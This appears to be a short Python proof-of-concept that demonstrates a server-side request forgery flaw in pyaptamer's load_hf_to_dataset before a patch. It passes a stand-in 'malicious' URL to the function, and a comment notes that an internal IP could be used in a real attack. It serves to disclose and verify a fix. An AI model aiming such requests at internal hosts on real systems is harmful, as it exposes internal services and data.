"""Proof-of-concept script showing SSRF vulnerability in
`load_hf_to_dataset` prior to patching.

Run this with the unpatched version of the library to see an arbitrary URL
being downloaded into ``./hf_datasets``.  After applying the fixes, the
script will raise a ``ValueError`` and refuse to contact the host.
"""

from pyaptamer.datasets import load_hf_to_dataset

# attacker-controlled URL (could be internal IP in real attack)
malicious_url = "http://example.com/secret.txt"

print("Attempting download from", malicious_url)
try:
    load_hf_to_dataset(malicious_url, download_locally=True)
    print("Download completed (vulnerable behaviour)")
except Exception as e:
    print("Request blocked or error raised:", e)
